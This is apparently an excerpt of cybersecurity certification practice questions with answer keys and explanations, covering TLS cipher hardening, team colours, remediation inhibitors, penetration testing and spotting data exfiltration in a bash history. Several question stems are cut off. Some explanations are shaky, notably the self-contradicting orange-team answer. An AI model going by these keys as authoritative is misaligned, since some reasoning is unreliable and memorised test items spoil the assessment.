> (0-RTT) mode, which allows resuming previous sessions without
> additional round trips.
>
> It supports forward secrecy by default, which means that compromising
> the long-term keys does not affect the security of past sessions.
>
> Remove cipher suites that use CBC. Cipher suites are combinations of
> cryptographic algorithms that specify how TLS connections are secured.
> Cipher suites that use CBC mode are vulnerable to padding oracle
> attacks, as well as other attacks such as BEAST and Lucky 13.
> Therefore, they should be removed from the server\'s configuration and

> Which of the following teams is the analyst a member of?

A.  Orange team

B.  Blue team

C.  Red team

D.  Purple team

### Answer: A 

### Explanation:

> An orange team is a team that is involved in facilitation and training
> of other teams in cybersecurity. An orange team assists the yellow
> team, which is the management or leadership team that oversees the
> cybersecurity strategy and governance of an organization. An orange
> team helps the yellow team to understand the cybersecurity risks and
> challenges, as well as the roles and responsibilities of other teams,
> such as the red, blue, and purple teams. In this scenario, the analyst
> is conducting monitoring against an authorized team that will perform
> adversarial techniques. This means that the analyst is observing and
> evaluating the performance of another team that is simulating
> real-world attacks against the organization\'s systems or networks.
> This could be either a red team or a purple team, depending on whether
> they are working independently or collaboratively with the defensive
> team. The analyst interacts with the team twice per day to set the
> stage for the techniques to be used. This means that the analyst is
> providing guidance and feedback to the team on how to conduct their
> testing and what techniques to use. This could also involve setting up
> scenarios, objectives, rules of engagement, and success criteria for
> the testing. This implies that the analyst is facilitating and
> training the team to improve their skills and capabilities in
> cybersecurity. Therefore, based on these descriptions, the analyst is
> a member of an orange team, which is involved in facilitation and
> training of other teams in cybersecurity.

> inhibitors to remediation does this scenario illustrate?

A.  Service-level agreement

B.  Business process interruption

C.  Degrading functionality

D.  Proprietary system

### Answer: B 

### Explanation:

> Business process interruption is the inhibitor to remediation that
> this scenario illustrates. Business process interruption is when the
> remediation of a vulnerability or an incident requires the disruption
> or suspension of a critical or essential business process, such as the
> point-of-sale application. This can cause operational, financial, or
> reputational losses for the organization, and may outweigh the
> benefits of the remediation. Therefore, the organization may decide to
> postpone or avoid the remediation until a more convenient time, such
> as a change freeze window, which is a period of time when no changes
> are allowed to the IT environment. Servicelevel agreement, degrading
> functionality, and proprietary system are other possible inhibitors to
> remediation, but they are not relevant to this scenario. Service-level
> agreement is when the remediation of a vulnerability or an incident
> violates or affects the contractual obligations or expectations of the
> service provider or the customer. Degrading functionality is when the
> remediation of a vulnerability or an incident reduces or impairs the
> performance or usability of a system or an application. Proprietary
> system is when the remediation of a vulnerability or an incident
> involves a system or an application that is owned or controlled by a

A.  Static testing

B.  Vulnerability testing

C.  Dynamic testing

D.  Penetration testing

### Answer: D 

### Explanation:

> Penetration testing is the best strategy to evaluate the security of
> the software without the source code. Penetration testing is a type of
> security testing that simulates real-world attacks on the software to
> identify and exploit its vulnerabilities. Penetration testing can be
> performed on the

> access to the source code or the internal structure of the software.
> Penetration testing can help the analyst to assess the security
> posture of the software, the potential impact of the vulnerabilities,
> and the effectiveness of the existing security controls. Static
> testing, vulnerability testing, and dynamic testing are other types of
> security testing, but they usually require access to the source code
> or the internal structure of the software. Static testing is the
> analysis of the software code or design without executing it.
> Vulnerability testing is the identification and evaluation of the

![](/static/images/image150.jpeg)

> Which of the following actions should the analyst take?

A.  Declare an incident and look for data exfiltration.

B.  Declare an incident and look for lateral movements.

C.  Declare a false positive and close the alarm.

D.  Declare an incident and look for malware in the affected machine.

### Answer: A 

### Explanation:

> The Bash history shows a small Python script being written that reads
> "secretsauce.txt," retrieves each entry via HTTP, and then POSTS the
> retrieved content to an external server. Finally, the script is marked
> executable and run. This is a clear attempt to siphon sensitive data
> off‑host, so you should treat it as a confirmed incident and
> investigate what data has been exfiltrated.
